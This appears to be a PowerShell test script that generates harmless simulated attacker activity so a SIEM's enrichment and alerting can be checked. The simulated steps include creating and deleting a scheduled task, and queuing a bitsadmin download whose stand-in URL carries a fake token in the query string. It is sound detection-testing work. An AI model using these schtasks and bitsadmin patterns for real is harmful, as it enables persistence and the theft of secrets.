# Live enrichment test. Marks harmless real activity as bad in a synthetic file, makes that activity
# happen, and checks the results. Then stops the enricher to prove alerts do not depend on it.
# Nothing is really malicious, and everything created is removed. Results go to -Folder.
param([Parameter(Mandatory)] [string] $Folder)
$Repo = Split-Path (Split-Path $PSScriptRoot)
$Distro = 'Ubuntu-24.04'
$Script = '/mnt/c' + ($Repo.Substring(2) -replace '\\', '/') + '/tests/enrichment/run_live_enrichment.py'
$Marker = Join-Path $Folder 'marker.json'
$WslMarker = '/mnt/c' + ($Marker.Substring(2) -replace '\\', '/')
$Log = Join-Path $Folder 'live.txt'
function Note([string] $Text) { Add-Content -LiteralPath $Log -Value "$(Get-Date -Format s) $Text" -Encoding UTF8 }
function Root { wsl.exe -d $Distro -u root @args 2>&1 | ForEach-Object { "$_" } }
function Check([string] $Action) { Root python3 -B $Script $Action $WslMarker | ForEach-Object { Note "  $_" } }

$Tag = 'siemti' + [guid]::NewGuid().ToString('N').Substring(0, 10)
$Domain = "$Tag.example.com"
$Address = ([Net.Dns]::GetHostAddresses('example.com') | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).IPAddressToString
$Tool = "$env:SystemRoot\System32\schtasks.exe"
$Hash = (Get-FileHash $Tool -Algorithm SHA256).Hash.ToLower()
$Url = "http://$Domain/sample.bin"
$Secret = 'FAKETOKEN' + [guid]::NewGuid().ToString('N').Substring(0, 12)
@{ tag = $Tag; ip = $Address; domain = $Domain; sha256 = $Hash; url = $Url; secret = $Secret; started = (Get-Date).ToUniversalTime().ToString('o') } | ConvertTo-Json | Set-Content -LiteralPath $Marker -Encoding ASCII

Note '=== synthetic file installed'
Check 'prepare'

Note '=== real activity'
$Client = New-Object Net.Sockets.TcpClient
try { $Client.ConnectAsync($Address, 443).Wait(4000) | Out-Null } catch { } finally { $Client.Close() }
Resolve-DnsName $Domain -ErrorAction SilentlyContinue | Out-Null
& $Tool /create /tn $Tag /tr "cmd.exe /c rem $Tag" /sc once /st 23:59 /f 2>$null | Out-Null
Start-Sleep -Seconds 1
& $Tool /delete /tn $Tag /f 2>$null | Out-Null
# bitsadmin only records the URL. The job is cancelled, and nothing is fetched.
& bitsadmin.exe /create $Tag | Out-Null
& bitsadmin.exe /addfile $Tag "${Url}?token=$Secret" "C:\Windows\Temp\$Tag.bin" | Out-Null
& bitsadmin.exe /cancel $Tag | Out-Null
Note 'activity done'

Note '=== results'
Check 'verify'

Note '=== alerts do not depend on the enricher'
Root systemctl stop siem-enricher | Out-Null
Note "enricher: $(Root systemctl is-active siem-enricher)"
$During = "siemout$([guid]::NewGuid().ToString('N').Substring(0, 8))"
& $Tool /create /tn $During /tr "cmd.exe /c rem $During" /sc once /st 23:59 /f 2>$null | Out-Null
Start-Sleep -Seconds 1
& $Tool /delete /tn $During /f 2>$null | Out-Null
Set-Content -LiteralPath (Join-Path $Folder 'during.txt') -Value $During -Encoding ASCII
Start-Sleep -Seconds 330
$Count = Root python3 -B -c "import json,subprocess;d=json.loads(subprocess.run(['curl','-sS','--cacert','/etc/opensearch/root-ca.pem','-K','/root/.siem/opensearch-admin.curl','https://127.0.0.1:9200/siem-alerts-*/_count?q=evidence_ref:*'],capture_output=True,text=True).stdout);print(d.get('count'))"
Note "alerts stored with the enricher stopped: $Count"
Note "detector: $(Root systemctl is-active siem-detector)"
Root systemctl start siem-enricher | Out-Null
Note "enricher: $(Root systemctl is-active siem-enricher)"
Check 'independence'
Note 'DONE'
